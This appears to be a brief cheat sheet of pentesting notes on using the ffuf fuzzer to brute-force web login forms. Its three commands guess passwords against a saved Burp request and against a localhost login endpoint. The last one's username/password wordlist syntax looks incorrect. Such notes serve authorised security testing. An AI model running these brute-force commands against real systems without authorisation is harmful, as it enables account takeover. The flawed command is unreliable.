# Info

**ffuf** (Fuzz Faster U Fool) is a versatile and fast web fuzzer used for discovering hidden files and directories, fuzzing parameters, and performing content discovery on websites.

---

# Brute-Force login

Save a login attempt with burpsuit then use it for `[file]`. Make sure to use select all and `right-click copy to file` after adding **FUZZ**
```bash
ffuf -request [file name] -request-proto http -w /usr/share/wordlists/SecLists/Passwords/xato-net-10-million-passwords-10000.txt
```

Passing ffuf the data section instead of whole file
```bash
ffuf -u http://localhost:9090/login -X POST -d "j_username=admin&j_password=FUZZ&from=%2F&Submit=Sign+in" -w /path/to/wordlist.txt
```

Testing user and pass
```bash
ffuf -u http://localhost:9090/login -X POST -d "j_username=FUZZ&j_password=FUZZ2&from=%2F&Submit=Sign+in" -w /path/to/usernames.txt:/path/to/passwords.txt
```

